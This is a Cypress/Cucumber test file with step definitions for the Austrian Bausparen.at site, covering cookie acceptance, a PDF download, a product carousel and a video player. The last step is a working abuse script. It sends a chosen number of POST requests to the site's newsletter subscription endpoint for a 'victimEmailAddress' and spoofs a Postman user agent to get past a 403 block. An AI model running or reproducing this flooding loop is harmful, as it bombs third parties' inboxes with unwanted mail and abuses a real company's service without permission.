import { When, Then, And, Given } from "@badeball/cypress-cucumber-preprocessor";

And("I see the button for download info about product", () => {
  cy.get('.cta-wrapper-content-box span',{timeout:20000}).should("be.visible").should('have.text','Download Produktinfos')
});

And("Accept all cookies", () => {
  cy.get('#onetrust-accept-btn-handler',{timeout:20000}).should("be.visible").click()
});

And("I click to the download button", () => {
  cy.get('.cta-wrapper-content-box a',{timeout:3000}).invoke('removeAttr', 'target').click() //trick to open on the same page. You should use capability     chromeWebSecurity: false
  cy.url().should('eq','https://www.raibau.at/mmedia/webuse/ssl/1480937785.pdf')
});

And("I see videoplayer", ()=>
{
 const videoplayer =  cy.get('.video')
  videoplayer.should('be.visible')
  videoplayer.click()
});
And("I click to arrow", ()=> 
{
  cy.get('.stage-arrow-next > .icon').click()
});

When("I see Unsere Produkte carousel with 3 items", ()=>
{
  cy.get('#slick-slide00').should('be.visible')
  cy.get('#slick-slide01').should('be.visible')
  cy.get('#slick-slide02').should('be.visible')
});

When("I visit Bausparen web page", ()=> {
  cy.visit("https://www.bausparen.at/de/bausparen.html")
});

When("I scroll down for {string}px", (countOfPixel) => {
cy.scrollTo(0,countOfPixel)
});

Then("I see a tab with pdf", () => {
  cy.url().should('eq','https://www.raibau.at/mmedia/webuse/ssl/1480937785.pdf')
});


Then("I should see last item",()=>
{
  cy.get('#slick-slide03').should('be.visible')
})

Then("videoplayer is working", () => 
{
  const videoplayer = cy.get('.video')
  videoplayer.get('.vjs-control-bar').should('be.visible')
});

When("I want make{string} requests from service api to email{string}",(counterOfRequests,victimEmailAddress)=>
{
  for(let i = 0; i<counterOfRequests; i++){
        cy.request({
          method: 'POST',
          form: true,
          url: 'https://www.bausparen.at/de/bausparen/_jcr_content/root/responsivegrid/subscription_copy_co.subscribe.json',
          headers: {
            'Accept' : '*/*',
            'Connection' : 'keep-alive',
            'User-Agent' : 'PostmanRuntime/7.29.2' // tricky, without specific Postman user agent it is not working (return 403), I guess your testers has to check it with Postman :)
          },
          body: {       
            "emailAddress": victimEmailAddress,
          }
        }).then(response => {
          expect(response.status).to.eq(200)
        })
      }
});